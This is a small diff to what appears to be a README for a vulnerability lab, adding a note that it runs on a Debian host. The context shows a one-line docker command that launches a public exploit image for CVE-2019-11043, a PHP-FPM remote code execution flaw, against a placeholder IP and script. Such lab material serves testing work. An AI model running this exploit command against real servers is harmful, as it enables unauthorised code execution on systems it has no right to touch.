@@ -7,7 +7,7 @@
 ### test exploit 
 `docker run --rm --net=host ypereirareis/cve-2019-11043 <ip>:8080/script.php`
 
-
+Note: this is meant to run on a debian host
 
 ## steps to create 
 * install docker using the script in this repo
